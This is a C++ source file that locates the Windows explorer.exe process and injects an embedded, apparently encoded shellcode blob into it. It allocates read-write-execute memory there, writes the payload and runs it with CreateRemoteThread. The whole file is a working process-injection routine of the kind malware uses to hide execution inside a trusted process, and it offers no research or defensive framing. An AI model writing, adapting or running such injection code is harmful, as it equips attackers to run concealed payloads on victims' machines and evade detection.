#include <windows.h>  
#include <tlhelp32.h>  
#include <iostream>  
#include "Header.h"

// Function to find the process ID of explorer.exe  
DWORD FindProcessId(const std::wstring& processName) {  
   HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);  
   if (snapshot == INVALID_HANDLE_VALUE) {  
       return 0;  
   }  

   PROCESSENTRY32 processEntry = { 0 };  
   processEntry.dwSize = sizeof(PROCESSENTRY32);  

   if (Process32First(snapshot, &processEntry)) {  
       do {  
           if (processName == processEntry.szExeFile) {  
               CloseHandle(snapshot);  
               return processEntry.th32ProcessID;  
           }  
       } while (Process32Next(snapshot, &processEntry));  
   }  

   CloseHandle(snapshot);  
   return 0;  
}  

int InjectExplorer() {  
   // Shellcode to inject  
   unsigned char shellcode[] =  
       "\xdb\xd6\xba\x7e\xd9\x42\x52\xd9\x74\x24\xf4\x5b\x31\xc9"  
       "\xb1\x31\x31\x53\x18\x03\x53\x18\x83\xc3\x7a\x3b\xb7\xae"  
       "\x6a\x39\x38\x4f\x6a\x5e\xb0\xaa\x5b\x5e\xa6\xbf\xcb\x6e"  
       "\xac\x92\xe7\x05\xe0\x06\x7c\x6b\x2d\x28\x35\xc6\x0b\x07"  
       "\xc6\x7b\x6f\x06\x44\x86\xbc\xe8\x75\x49\xb1\xe9\xb2\xb4"  
       "\x38\xbb\x6b\xb2\xef\x2c\x18\x8e\x33\xc6\x52\x1e\x34\x3b"  
       "\x22\x21\x15\xea\x39\x78\xb5\x0c\xee\xf0\xfc\x16\xf3\x3d"  
       "\xb6\xad\xc7\xca\x49\x64\x16\x32\xe5\x49\x97\xc1\xf7\x8e"  
       "\x1f\x3a\x82\xe6\x5c\xc7\x95\x3c\x1f\x13\x13\xa7\x87\xd0"  
       "\x83\x03\x36\x34\x55\xc7\x34\xf1\x11\x8f\x58\x04\xf5\xbb"  
       "\x64\x8d\xf8\x6b\xed\xd5\xde\xaf\xb6\x8e\x7f\xe9\x12\x60"  
       "\x7f\xe9\xfd\xdd\x25\x61\x13\x09\x54\x28\x79\xcc\xea\x56"  
       "\xcf\xce\xf4\x58\x7f\xa7\xc5\xd3\x10\xb0\xd9\x31\x55\x4e"  
       "\x90\x18\xff\xc7\x7d\xc9\x42\x8a\x7d\x27\x80\xb3\xfd\xc2"  
       "\x78\x40\x1d\xa7\x7d\x0c\x99\x5b\x0f\x1d\x4c\x5c\xbc\x1e"  
       "\x45\x3f\x23\x8d\x05\xee\xc6\x35\xaf\xee";  

   // Find the process ID of explorer.exe  
   DWORD processId = FindProcessId(L"explorer.exe");  
   if (processId == 0) {  
       std::cerr << "Failed to find explorer.exe process." << std::endl;  
       return -1;  
   }  

   // Open the target process  
   HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);  
   if (processHandle == NULL) {  
       std::cerr << "Failed to open explorer.exe process. Error: " << GetLastError() << std::endl;  
       return -1;  
   }  

   // Allocate memory in the target process  
   LPVOID allocatedMemory = VirtualAllocEx(  
       processHandle,  
       NULL,  
       sizeof(shellcode),  
       MEM_COMMIT | MEM_RESERVE,  
       PAGE_EXECUTE_READWRITE  
   );  

   if (allocatedMemory == NULL) {  
       std::cerr << "Memory allocation in target process failed. Error: " << GetLastError() << std::endl;  
       CloseHandle(processHandle);  
       return -1;  
   }  

   // Write the shellcode to the allocated memory  
   if (!WriteProcessMemory(processHandle, allocatedMemory, shellcode, sizeof(shellcode), NULL)) {  
       std::cerr << "Failed to write shellcode to target process. Error: " << GetLastError() << std::endl;  
       VirtualFreeEx(processHandle, allocatedMemory, 0, MEM_RELEASE);  
       CloseHandle(processHandle);  
       return -1;  
   }  

   // Create a remote thread to execute the shellcode  
   HANDLE remoteThread = CreateRemoteThread(  
       processHandle,  
       NULL,  
       0,  
       (LPTHREAD_START_ROUTINE)allocatedMemory,  
       NULL,  
       0,  
       NULL  
   );  

   if (remoteThread == NULL) {  
       std::cerr << "Failed to create remote thread in target process. Error: " << GetLastError() << std::endl;  
       VirtualFreeEx(processHandle, allocatedMemory, 0, MEM_RELEASE);  
       CloseHandle(processHandle);  
       return -1;  
   }  

   // Wait for the remote thread to finish  
   WaitForSingleObject(remoteThread, INFINITE);  

   // Clean up  
   CloseHandle(remoteThread);  
   VirtualFreeEx(processHandle, allocatedMemory, 0, MEM_RELEASE);  
   CloseHandle(processHandle);  

   std::cout << "Shellcode injected and executed successfully." << std::endl;  
   return 0;  
}
